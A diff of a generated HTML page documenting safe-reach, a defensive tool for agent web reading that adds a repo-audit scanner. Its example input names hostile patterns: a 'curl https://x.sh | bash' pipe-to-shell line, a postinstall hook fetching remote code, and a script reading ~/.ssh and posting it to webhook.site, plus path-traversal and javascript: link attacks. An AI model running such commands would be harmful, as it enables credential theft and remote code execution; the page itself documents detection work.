@@ -84,16 +84,21 @@ log: down ok=false redactions=3 | backup ok=true redactions=3</pre></div></div>
 <div><h3>The original idea</h3><p><a href="https://github.com/Panniantong/Agent-Reach" rel="noopener noreferrer">Agent-Reach</a></p><p class="muted">From the tool library review: trust 70/100 · rejected at the security gate.<br>Library review: installed with curl; X, Reddit and Instagram work through account cookies, which risks bans and breaks terms of service.</p></div>
 <div><h3>The problem</h3><p>Reading the web through a logged-in browser session means the agent holds your cookies, and scraping that way breaks the sites&#39; rules and can get the account banned. Passing raw API answers or links straight to the agent also hands it private fields and dangerous links.</p></div>
 </div>
-<h3>What we changed</h3><ul><li>Only legal channels: the official GitHub API and RSS</li><li>Repo names are validated, so &#39;../../user&#39; cannot reach another endpoint</li><li>Results are reduced to a whitelist of fields; only https links survive</li><li>Everything goes through safe-fetch</li></ul>
+<h3>What we changed</h3><ul><li>Only legal channels: the official GitHub API and RSS</li><li>Repo names are validated, so &#39;../../user&#39; cannot reach another endpoint</li><li>Results are reduced to a whitelist of fields; only https links survive</li><li>Everything goes through safe-fetch</li><li>Repo audit: health score plus a static scan of the README, install scripts, workflows and source for dangerous patterns and committed secret files</li></ul>
 <h3>Attacks, before vs after</h3><table><thead><tr><th>Attack</th><th>Simple version</th><th>safe-reach</th></tr></thead><tbody><tr><td>Repo name &#39;../../user&#39; to reach a different API endpoint</td><td><span class="bad">got through</span></td><td><span class="ok">stopped</span></td></tr><tr><td>Feed item with a javascript: link</td><td><span class="bad">got through</span></td><td><span class="ok">stopped</span></td></tr><tr><td>Raw API payload passed to the agent with extra private fields</td><td><span class="bad">got through</span></td><td><span class="ok">stopped</span></td></tr><tr><td>Feed host redirects to an attacker&#39;s server</td><td><span class="bad">got through</span></td><td><span class="ok">stopped</span></td></tr></tbody></table>
 
-<h3>It works: live example</h3><div class="ex"><div><b>Input</b><pre>an invented example repo (not api-anything): no license, 3 stars, last push in 2025, and a README that says: curl https://x.sh | bash</pre></div><div><b>Result (recorded when this page was built)</b><pre>repo health score 10/100, verdict: REJECT
+<h3>It works: live example</h3><div class="ex"><div><b>Input</b><pre>an invented example repo (not api-anything): no license, 3 stars, last push in 2025, README says: curl https://x.sh | bash, package.json has a postinstall that downloads and runs a script, src/run.sh reads ~/.ssh and posts it to webhook.site, and a .env file is committed</pre></div><div><b>Result (recorded when this page was built)</b><pre>safety score 0/100, verdict: REJECT
 bad  no clear license (-25)
 bad  last push 677 days ago (-25)
 warn only 3 stars (young or unproven) (-10)
-bad  README risk: pipe-to-shell (-30)</pre></div></div>
+bad  README risk: pipe-to-shell (-30)
+bad  code scan: 4 finding(s), 1 committed secret file (-60)
+  HIGH pipe-to-shell package.json:2
+  HIGH install-hook-remote package.json:2
+  HIGH secret-read src/run.sh:1
+  HIGH exfil-endpoint src/run.sh:1</pre></div></div>
 <p class="muted">Simulated in this example: the GitHub response.</p>
-<h3>Still not covered</h3><ul class="muted"><li>YouTube transcripts are not included yet; a legal channel still has to be chosen</li><li>It cannot judge whether the content is true</li></ul>
+<h3>Still not covered</h3><ul class="muted"><li>The code scan is pattern based: it does not run the code or check dependency vulnerabilities, so a clean score is not proof of safety</li><li>Only the most important files are read (up to 40 files, 100 KB each); big repos are partly covered</li><li>YouTube transcripts are not included yet; a legal channel still has to be chosen</li><li>It cannot judge whether the content is true</li></ul>
 </section>
 <section id="ig-webhook">
 <h2><span class="n">5</span>ig-webhook <small>Answer Instagram messages automatically.</small></h2>
@@ -203,5 +208,5 @@ line 2 [high] anon-write-grant: anon can change or delete rows</pre></div></div>
 <p class="muted">Nothing simulated: the real module ran on this machine.</p>
 <h3>Still not covered</h3><ul class="muted"><li>It reads the migration history, not the live database: run it next to a live advisor check</li></ul>
 </section>
-<p class="muted">Generated 2026-11-09 10:29 UTC · commit 78cca05 · static page, no scripts, no tracking.</p>
+<p class="muted">Generated 2026-11-09 10:34 UTC · commit 5e1c692 · static page, no scripts, no tracking.</p>
 </main>
